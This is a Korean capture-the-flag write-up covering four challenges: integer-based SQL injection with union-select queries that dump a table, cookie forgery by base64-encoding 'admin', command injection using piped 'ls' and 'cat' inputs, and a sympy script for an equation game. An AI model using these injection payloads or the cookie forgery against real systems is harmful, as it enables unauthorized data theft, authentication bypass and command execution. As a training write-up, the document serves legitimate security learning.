고등해커 Write_Up (Yung Wave)
============================
## Legendary feather
----------------------

### 문제 해결 흐름

> 문제 링크를 들어가 보니, 1 2 3 페이지가 존재했고, url 창에 no=숫자 형식으로 사이트가 바뀜
  >> 여기서 no=를 이용하여 풀어야겠다고 생각을하게 됨
   >>> 그래서 각종 or and * + 등을 넣어본 결과 and가 먹힌다는 정보 발견!

#### 위 과정을 통해 정보를 얻고, and와 sql문을 이용하여 테이블 이름, 컬럼 이름, 컬럼 개수를 알아내 문제를 해결함

### 문제 풀이

#### and 입력 가능한지 확인
! [and 입력 시도] (./선린의털(1).PNG)

위 사진과 같이 and가 먹히는걸 확인할 수 있다.
#### 컬럼 개수 알아 내기
! [컬럼 갯수 알아내기] (./선린의털(2).PNG)

위 사진과 같이 order by를 이용하여 컬럼 개수를 알아냈다.

> no=3 and 3 order by 1
> 
> no=3 and 3 order by 2
> 
> no=3 and 3 order by 3 여기서 부터 오류

따라서 컬럼 개수는 2개

! [테이블 이름 알아내기] (./선린의털(3).PNG)

> no=3 union select 1,info from information_schema.processlist order by 1

쿼리 출력을 이용하여 컬럼명이 contents

! [컬럼 이름 알아내기] (./선린의털(4).PNG)

> no=3 union select 1, group_concat(column_name) from information_schema.columns where table_name="contents" order by 1

contents 테이블에서 group_concat으로 컬럼 이름을 한줄로 묶어서 출력 
(order by로 no을 정렬해줘서 원하는 정보인 컬럼 이름 출력)

! [fleg 알아내기!] (./선린의털(5).PNG)

> no=3 union select 1, group_concat(content) from contents order by 1

이렇게 content에 있는 내용을 전부 합쳐 no 1에 맞춰주고 정렬하여 출력해줬다.

##### flag : Sunrin{Baby_integer_based_sql_injection}

## Basic login
--------

### 문제 해결 흐름
> sunrin 으로 로그인하여 f12로 쿠키 확인 
> > username값 확인 (base64 인코딩 되어있음)
> >> admin (base64로 인코딩)해서 username 값에 넣기

! [쿠키 확인] (./Basic_Login(1).PNG)

개발자 도구로 username 변수 값 확인

base64 디코딩 해보니 sunrin

! [flag 얻기] (./Basic_Login(2).PNG)

admin을 base64로 인코딩하여 username 변수에 대입

새로고침 -> clear

##### flag : Sunrin{C0okie_f0rgery_1s_e4sy}

## nslookup
--------

### 문제 해결 흐름
> 이 문제와 비슷한 문제를 본적이 있음
> > 리눅스 명령어를 활용하여 풀어야 한다는 것을 바로 느낌
> >> 리눅스 명령어를 활용해 풀기

! [ls 입력] (./nslookup(1).PNG)

> 아무 값 | ls

or 이용해서 파일을 한번 봤는데 flag 파일 발견

! [flag 확인] (./nslookup(2).PNG)

> 아무 값 | cat flag 파일 이름

##### flag : Sunrin{easy_command_injection_in_the_webapp}

## Easy Math Game
--------

### 문제 해결 흐름
> nc로 접속해보니 일반적인 방정식 문제였다.
> > 퍼블을 위해 파이썬으로 방정식 풀이 코드 작성하여 문제 풀기

![문제확인] (./Easy_Math_Game(1).PNG)

위와 같이 문제 확인

![코드 테스트] (./Easy_Math_Game(2).PNG)

##### 계수 입력하면 풀어주는 코드

```
from sympy import Symbol, solve, Eq

for i in range(8):
    x = Symbol('x')
    y = Symbol('y')

    a = []
    for i in range(6):
        a.append(int(input()))

    e1 = Eq(a[1]*y, -a[0]*x + a[2])
    e2 = Eq(a[4]*y, -a[3]*x + a[5])

    print(solve([e1, e2], x, y))

while True:
    x = Symbol('x')
    y = Symbol('y')

    a = []
    for i in range(3):
        a.append(int(input()))
    
    eqn = Eq(a[0]*x**2 + a[1]*x + a[2], 0)
    print(solve(eqn, x))
```

! [flag 확인] (./nslookup(3).PNG)

##### flag : Sunrin{Th1s_1s_B4sic_m4th_g4m3}